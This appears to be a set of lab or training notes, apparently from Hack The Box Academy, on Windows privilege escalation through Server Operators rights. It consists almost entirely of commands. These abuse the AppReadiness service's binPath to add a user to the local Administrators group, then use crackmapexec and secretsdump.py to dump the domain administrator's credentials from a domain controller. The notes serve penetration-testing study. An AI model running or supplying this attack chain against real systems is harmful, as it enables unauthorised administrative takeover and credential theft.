# Checking Service Permissions with PsService
```powershell
PsService.exe security AppReadiness

[ALLOW] BUILTIN\Server Operators
                All
```

# Checking Local Admin Group Membership
```powershell
net localgroup Administrators
```

# Modifying the Service Binary Path
```powershell
sc.exe config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

# Starting the Service
```powershell
sc start AppReadiness
net localgroup Administrators
```

# Confirming Local Admin Access on Domain Controller
```powershell
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```
